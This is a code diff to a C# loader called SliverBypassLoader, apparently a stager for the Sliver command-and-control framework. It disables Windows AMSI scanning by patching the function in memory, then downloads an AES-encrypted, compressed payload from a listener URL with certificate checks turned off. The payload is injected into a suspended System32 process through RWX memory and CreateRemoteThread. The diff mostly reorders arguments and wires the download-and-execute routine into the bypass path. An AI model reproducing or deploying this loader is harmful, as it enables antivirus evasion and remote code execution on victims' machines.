@@ -149,8 +149,8 @@ namespace SliverBypassLoader
                 !string.IsNullOrEmpty(args[4]))
             {
                 listenerUrl = args[0];
-                compressAlgorithm = args[1];
-                targetBinary = args[2];
+                targetBinary = args[1];
+                compressAlgorithm = args[2];
                 aesKey = args[3];
                 aesIv = args[4];
             }
@@ -175,6 +175,8 @@ namespace SliverBypassLoader
             VirtualProtect(get_l_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);
             var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
             Marshal.Copy(new_instr, 0, get_l_ptr, 4);
+
+            DownloadAndExecute(listenerUrl, targetBinary, compressAlgorithm, aesKey, aesIv);
         }
 
         // Dynamically search for and patch AmsiScanBuffer and AmsiScanString
@@ -236,8 +238,11 @@ namespace SliverBypassLoader
             }
         }
 
-        public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] AESKey, byte[] AESIV)
+        public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, string aeskey, string aesiv)
         {
+            byte[] AESKey = Encoding.ASCII.GetBytes(aeskey);
+            byte[] AESIV = Encoding.ASCII.GetBytes(aesiv);
+
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new WebClientWithTimeout();
 
@@ -245,6 +250,7 @@ namespace SliverBypassLoader
             List<byte> l = new List<byte> { };
             byte[] actual;
             byte[] compressed;
+
             if (AESKey != null && AESIV != null)
             {
 
@@ -260,7 +266,6 @@ namespace SliverBypassLoader
             else
             {
                 compressed = encrypted;
-
             }
 
             byte[] sc = Decompress(compressed, CompressionAlgorithm);
@@ -271,6 +276,7 @@ namespace SliverBypassLoader
             sInfo.dwFlags = 0;
             ProcessInformation pInfo;
             string binaryPath = "C:\\Windows\\System32\\" + binary;
+
             IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
             IntPtr hProcess = pInfo.hProcess;
             IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -281,6 +287,7 @@ namespace SliverBypassLoader
             CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
             return;
         }
+
         public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
         {
             byte[] decompressedArray = null;
@@ -393,7 +400,7 @@ namespace SliverBypassLoader
                 throw new InstallException("Mandatory parameter 'aesIv' is missing");
             }
 
-            string[] args = new string[] { listenerUrl, compressAlgorithm, targetBinary, aesKey, aesIv };
+            string[] args = new string[] { listenerUrl, targetBinary, compressAlgorithm, aesKey, aesIv };
             altbypass.Main(args);
         }
     }
